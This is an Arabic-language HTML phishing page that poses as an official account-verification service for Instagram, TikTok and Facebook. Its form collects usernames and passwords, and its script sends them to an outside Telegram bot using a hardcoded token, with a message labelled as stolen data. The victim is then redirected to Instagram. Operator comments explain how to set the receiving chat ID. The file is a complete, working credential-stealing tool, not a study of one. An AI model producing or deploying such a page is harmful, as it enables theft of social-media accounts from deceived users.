<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق الحسابات الرسمي - تحقق الآن</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .phishing-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); width: 350px; text-align: center; }
        h2 { color: #1877f2; margin-bottom: 20px; }
        .platform-icons { display: flex; justify-content: center; gap: 15px; margin-bottom: 25px; font-size: 30px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.3s; font-weight: bold; }
        button:hover { background: #0074cc; }
        .status { margin-top: 15px; font-size: 14px; color: #666; }
        .loading { display: none; color: #28a745; font-weight: bold; }
    </style>
</head>
<body>

<div class="phishing-box">
    <div class="platform-icons">
        <span>📸</span> <span>🎵</span> <span>📘</span>
    </div>
    <h2>توثيق الحسابات الرسمية</h2>
    <p>أدخل بيانات حسابك لتفعيل علامة "التحقق" (العلامة الزرقاء) على إنستغرام، تيك توك، وفيسبوك.</p>
    
    <form id="loginForm">
        <input type="text" id="username" placeholder="اسم المستخدم" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        <input type="text" id="platform" placeholder="رابط الحساب (اختياري)" required>
        <button type="submit">توثيق الحساب الآن</button>
    </form>
    <div id="statusMsg" class="status"></div>
    <div id="loadingMsg" class="loading">جاري الاتصال بخادم التوثيق...</div>
</div>

<script>
    // ==========================================
    // إعدادات البوت (تم ربط توكنك)
    // ==========================================
    const BOT_TOKEN = '9119814262:AAHERSEI2E-dRsPzqV73ZfsNiktV3IDHKV8';
    
    // *** هام: استبدل الرقم أدناه بمعرفك الشخصي (Chat ID) ***
    // يمكنك الحصول عليه عن طريق إرسال رسالة للبوت ثم الطلب من @userinfobot
    const CHAT_ID = '123456789'; 
    // ==========================================

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const platform = document.getElementById('platform').value;
        const statusMsg = document.getElementById('statusMsg');
        const loadingMsg = document.getElementById('loadingMsg');

        loadingMsg.style.display = 'block';
        statusMsg.textContent = '';

        const message = `🚨 <b>بيانات جديدة تم سرقتها!</b> 🚨\n\n👤 <b>اسم المستخدم:</b> ${username}\n🔑 <b>كلمة المرور:</b> ${password}\n🔗 <b>الرابط:</b> ${platform}\n\n🕒 <b>الوقت:</b> ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => {
            if (response.ok) {
                loadingMsg.style.display = 'none';
                statusMsg.style.color = 'green';
                statusMsg.textContent = 'تم إرسال البيانات بنجاح! جاري التوثيق...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com'; 
                }, 3000);
            } else {
                loadingMsg.style.display = 'none';
                statusMsg.style.color = 'red';
                statusMsg.textContent = 'خطأ: تأكد من صحة الـ Chat ID.';
            }
        })
        .catch(error => {
            loadingMsg.style.display = 'none';
            statusMsg.style.color = 'red';
            statusMsg.textContent = 'حدث خطأ في الاتصال.';
            console.error('Error:', error);
        });
    });
</script>

</body>
</html>
